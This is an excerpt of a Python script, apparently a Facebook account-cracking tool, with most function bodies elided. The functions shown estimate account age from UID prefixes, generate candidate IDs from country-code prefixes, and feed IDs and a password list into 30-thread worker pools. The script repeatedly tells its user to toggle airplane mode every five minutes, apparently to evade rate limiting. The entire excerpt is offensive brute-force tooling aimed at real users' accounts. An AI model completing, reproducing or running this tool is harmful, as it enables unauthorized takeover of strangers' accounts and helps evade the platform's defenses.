...
def alex(uid):
    if len(uid)==15:
        ...
        elif uid[:5] in ['61551']           :alif = '2023'
        elif uid[:4] in ['6155']           	:alif = '2023'
        elif uid[:3] in ['615']           	:alif = '2023'
        elif uid[:2] in ['61']           	:alif = '2023'
        else:alif=''
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse airplane mode every 5 minutes\033[1;37m")
                        linex()
                        for user in id:
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5; \033[92;1mUse airplane mode every 5 minutes\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
...
def pak():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;\033[92;1mUse airplane mode every 5 minutes\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as Aking:     
                        ...
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse airplane mode every 5 minutes\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
